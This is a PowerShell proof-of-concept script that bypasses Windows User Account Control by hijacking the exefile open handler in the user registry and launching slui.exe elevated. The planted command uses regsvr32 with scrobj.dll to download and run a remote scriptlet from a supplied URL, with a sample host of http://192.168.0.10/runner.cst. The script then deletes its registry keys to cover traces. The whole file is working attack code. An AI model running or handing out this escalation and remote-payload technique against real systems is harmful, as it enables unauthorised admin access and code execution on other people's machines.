<#
.SYNOPSIS
	This script is a proof of concept to bypass the User Access Control (UAC) via SluiFileHandlerHijackLPE
.NOTES
	Function   : SluiHijackBypass
	File Name  : SluiHijackBypass.ps1
	Author     : Gushmazuko
.LINK
	https://github.com/gushmazuko/tools/blob/master/SluiHijackBypass.ps1
	Original source: https://bytecode77.com/hacking/exploits/uac-bypass/slui-file-handler-hijack-privilege-escalation
.EXAMPLE
	Load "regsvr32 -s -n -u -i:http://192.168.0.10/runner.cst scrobj.dll" (By Default used 'arch 64'):
	SluiHijackBypass -http "http://192.168.0.10/runner.cst" -arch 64
#>

function SluiHijackBypass(){
	Param (

		[Parameter(Mandatory=$True)]
		[String]$http,
		#[String]$arch = 64,
		[ValidateSet(64,86)]
		[int]$arch = 64
	)

	$program = "regsvr32 -s -n -u -i:$http scrobj.dll"

	#Create registry structure
	New-Item "HKCU:\Software\Classes\exefile\shell\open\command" -Force
	New-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "DelegateExecute" -Value "" -Force
	Set-ItemProperty -Path "HKCU:\Software\Classes\exefile\shell\open\command" -Name "(default)" -Value $program -Force

	#Perform the bypass
	switch($arch)
	{
		64
		{
			#x64 shell in Windows x64 | x86 shell in Windows x86
			Start-Process "C:\Windows\System32\slui.exe" -Verb runas
		}
		86
		{
			#x86 shell in Windows x64
			C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\slui.exe -Verb runas"
		}
	}

	#Remove registry structure
	Start-Sleep 3
	Remove-Item "HKCU:\Software\Classes\exefile\shell\" -Recurse -Force
}